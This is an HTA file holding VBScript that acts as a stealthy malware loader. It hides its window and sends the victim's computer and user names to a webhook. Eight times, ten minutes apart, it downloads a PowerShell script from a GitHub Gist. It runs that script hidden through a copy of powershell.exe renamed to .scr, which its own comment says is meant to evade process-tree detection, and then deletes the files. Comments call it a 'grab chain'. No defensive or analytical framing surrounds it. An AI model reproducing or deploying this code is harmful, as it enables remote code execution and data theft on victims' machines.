<html><head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
window.resizeTo 0,0:window.moveTo -2000,-2000
On Error Resume Next

Dim sh, fso, WH, GIST_URL, PC, USER
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' ==========================================
' PUT YOUR WEBHOOK AND GIST URL HERE
' ==========================================
WH = ""
GIST_URL = "https://gist.githubusercontent.com/alexproisgamer-dotcom/607e9edddbab4ca67ebbfe0146767f06/raw/e6af6051649c4fc64df75ad2c13b21bd6d7faa91/update.ps1"

PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
USER = sh.ExpandEnvironmentStrings("%USERNAME%")

' --- Re-run grab chain 8x (every 10 min) ---
Dim runCount
For runCount = 1 To 8
    Call PostEmbed(":repeat: Re-grab " & runCount & "/8", "PC: " & PC & " | User: " & USER, 3447003)
    Call RunGist
    If runCount < 8 Then WScript.Sleep 600000 ' 10 minutes
Next

window.close()

Sub RunGist()
    ' Fetch the PS1 from the Gist
    Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056
    xh.Open "GET", GIST_URL, False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim pc: pc = xh.responseText
    If Len(pc) < 100 Then Exit Sub
    Set xh = Nothing

    ' Save to temp
    Dim psf: psf = sh.ExpandEnvironmentStrings("%TEMP%") & "\u.ps1"
    Dim f: Set f = fso.CreateTextFile(psf, True)
    f.Write pc
    f.Close
    
    ' Copy PowerShell to .scr to bypass process tree flags
    Dim psexec : psexec = sh.ExpandEnvironmentStrings("%TEMP%") & "\p.scr"
    Dim realPs : realPs = sh.ExpandEnvironmentStrings("%SystemRoot%") & "\System32\WindowsPowerShell\v1.0\powershell.exe"
    fso.CopyFile realPs, psexec, True
    
    ' Run it silently
    sh.Run """" & psexec & """ -NoP -NonI -W Hidden -ExecutionPolicy Bypass -File """ & psf & """", 0, True
    
    ' Cleanup
    fso.DeleteFile psf, True
    fso.DeleteFile psexec, True
End Sub

Sub PostEmbed(t, d, c)
    Dim DQ: DQ = Chr(34)
    Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "application/json"
    h.Send j
End Sub

Function Ej(s)
    Dim i, c, out
    out = ""
    For i = 1 To Len(s)
        c = Asc(Mid(s, i, 1))
        If c >= 32 Or c = 9 Or c = 10 Or c = 13 Then out = out & Mid(s, i, 1)
    Next
    out = Replace(out, Chr(92), Chr(92) & Chr(92))
    out = Replace(out, Chr(34), Chr(92) & Chr(34))
    out = Replace(out, vbCrLf, Chr(92) & "n")
    out = Replace(out, vbCr, Chr(92) & "n")
    out = Replace(out, vbLf, Chr(92) & "n")
    out = Replace(out, vbTab, Chr(92) & "t")
    Ej = out
End Function
</script>
</head><body></body></html>
